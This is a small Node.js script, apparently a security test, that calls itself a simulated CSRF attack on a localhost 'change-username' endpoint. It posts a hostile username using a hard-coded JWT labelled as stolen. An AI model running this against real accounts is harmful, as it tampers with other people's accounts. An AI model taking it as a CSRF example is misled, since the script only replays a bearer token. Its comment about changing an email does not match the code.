const axios = require("axios");

// This script simulates a CSRF attack by making a request to change a user's email

// Target URL
const targetUrl = "http://localhost:5000/api/users/change-username";

// Malicious payload
const payload = {
  username: "hackedhacker",
};

// The JWT token would be stolen or already present in the victim's browser
// For testing, you need to replace this with a valid JWT token from your application
const stolenJwtToken =
  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJTaGVyIG1zZHNkYW4iLCJpYXQiOjE3NDU2NzQ2MDMsImV4cCI6MTc0NTc2MTAwM30.fME2j6vqqK4Vk6rmkOr4Ym2Xk1kYXsoVBOu7_kn4jU8"; // Replace with a valid token

const executeAttack = async () => {
  try {
    // Make a request with the authorization header
    // In a real CSRF attack, the browser would automatically include cookies
    const response = await axios.post(targetUrl, payload, {
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${stolenJwtToken}`,
      },
    });

    console.log("CSRF Attack Successful!");
    console.log("Status:", response.status);
    console.log("Response:", response.data);
  } catch (error) {
    console.error("CSRF Attack Failed:", error.message);
    if (error.response) {
      console.log("Status:", error.response.status);
      console.log("Response:", error.response.data);
    }
  }
};

executeAttack();
